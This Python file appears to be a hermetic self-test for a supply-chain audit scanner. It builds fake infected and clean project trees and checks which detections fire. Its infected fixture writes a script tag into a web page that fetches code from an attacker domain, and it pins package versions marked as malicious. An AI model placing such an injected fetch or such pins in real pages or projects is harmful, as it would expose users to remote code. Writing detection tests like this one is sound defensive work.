#!/usr/bin/env python3
"""Hermetic self-test for runtime-supply-chain-audit.

Builds a synthetic tree with known-bad and known-good artifacts and asserts
every detection class fires — and that clean fixtures stay clean.
"""

from __future__ import annotations

import json
import shutil
import sys
import tempfile
from pathlib import Path

SKILL_DIR = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(SKILL_DIR / "scripts"))

from scan_runtime_supply_chain import (  # noqa: E402
    scan_root,
    _load_policy,
    _load_optimjack_into_policy,
)


def write(path: Path, content: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8")


def build_infected(root: Path) -> None:
    write(root / ".nvmrc", "26\n")
    write(
        root / "package.json",
        json.dumps({"name": "demo", "engines": {"node": ">= 18.12.0"}}, indent=2),
    )
    write(root / "Dockerfile", "FROM node:22.20.0-alpine\n")
    write(
        root / "requirements.txt",
        "\n".join(
            [
                "brotli==1.2.0",
                "certifi==2026.7.22",
                "pip==26.1.2",
                "litellm==1.107.0",
            ]
        )
        + "\n",
    )
    write(
        root / "poetry.lock",
        '[[package]]\nname = "brotli"\nversion = "1.2.0"\n\n'
        '[[package]]\nname = "certifi"\nversion = "2025.11.12"\n',
    )
    write(
        root / "deploy" / "Dockerfile-Python",
        'RUN pip install --upgrade pip && pip install --no-cache-dir \\\n'
        '    "litellm>=1.17.0,<2.0.0" \\\n'
        '    "httpx>=0.28.1"\n',
    )
    write(
        root / "web" / "index.html",
        '<script src="https://cdn.optimizely.com/js/123.js"></script>\n'
        '<script>window._k7 = 1; fetch("https://1688360.cc/track.js")</script>\n',
    )
    write(root / "tools" / "notes.md", "use bun@1.4.3 for local runs\n")
    write(
        root / "assets" / "hashes.txt",
        "f7b84b9a94f749f8ced3f0112d0a66894e8bbc3b4aa5592021d1b8976a9bad40\n",
    )


def build_clean(root: Path) -> None:
    write(root / ".nvmrc", "26.12.1\n")
    write(
        root / "package.json",
        json.dumps({"name": "demo", "engines": {"node": ">=26.12.1"}}, indent=2),
    )
    write(
        root / "requirements.txt",
        "\n".join(
            [
                "brotli==1.2.1",
                "certifi==2026.10.19",
                "pip==26.2.2",
                "litellm==1.61.6",
            ]
        )
        + "\n",
    )
    write(root / "web" / "index.html", "<h1>hello</h1>\n")


def checks_present(findings, *names: str) -> None:
    got = {f.check for f in findings}
    missing = [n for n in names if n not in got]
    assert not missing, f"missing checks {missing}; got {sorted(got)}"


def main() -> int:
    policy = _load_policy(SKILL_DIR / "policy" / "floors.json")
    _load_optimjack_into_policy(policy, SKILL_DIR, "", "")
    assert policy.get("_optimjack_pack"), "shipped OPTIMJACK IOC pack did not load"
    assert "stories.storifyme.com" in policy["optimjack_domains"]
    assert "1688360.cc" in policy["_optimjack_pack"]["attacker_domains"]

    tmp = Path(tempfile.mkdtemp(prefix="runtime-sca-selftest-"))
    try:
        infected = tmp / "infected"
        clean = tmp / "clean"
        build_infected(infected)
        build_clean(clean)

        bad = scan_root(infected, policy)
        checks_present(
            bad.findings,
            "V1-node",
            "V1-node-engines",
            "V1-node-docker",
            "V1-bun",
            "V2-brotli",
            "V3.1-litellm",
            "V3.1-litellm-range",
            "V3.2-certifi",
            "V3.2-pip",
            "V3.2-pip-unfloored",
            "V4-optimjack-cdn",
            "V4-optimjack-attacker-domain",
            "V4-optimjack-marker",
            "V4-optimjack-sha256",
        )

        good = scan_root(clean, policy)
        # engines with exact patched floor should not flag; nvmrc patched should not.
        assert not any(f.check.startswith("V1-node") and f.path.endswith(".nvmrc") for f in good.findings), good.findings
        assert not any(f.check == "V2-brotli" for f in good.findings), good.findings
        assert not any(f.check.startswith("V3.1") for f in good.findings), good.findings
        assert not any(f.check == "V3.2-certifi" for f in good.findings), good.findings
        assert not any(f.check.startswith("V4") for f in good.findings), good.findings

        # Policy file must exist and list OPTIMJACK domains.
        assert policy["optimjack_domains"], "empty OPTIMJACK domain list"
        assert "1.107.0" in policy["litellm"]["malicious_versions"]

        # xlsx loader round-trip when workbook is available in the environment
        xlsx = Path(
            "/cursor/stores/self/docs/OPTIMJACK_Complete_IOC_Intelligence_2026-11-17.xlsx"
        )
        if xlsx.is_file():
            sys.path.insert(0, str(SKILL_DIR / "scripts"))
            from load_optimjack_xlsx import extract_pack

            pack = extract_pack(xlsx)
            assert len(pack["attacker_domains"]) >= 10
            assert len(pack["sha256"]) >= 20
            assert "cdn.optimizely.com" in pack["poisoned_cdn_hosts"]

        print(f"PASS — infected findings={len(bad.findings)} clean_findings={len(good.findings)}")
        return 0
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


if __name__ == "__main__":
    sys.exit(main())
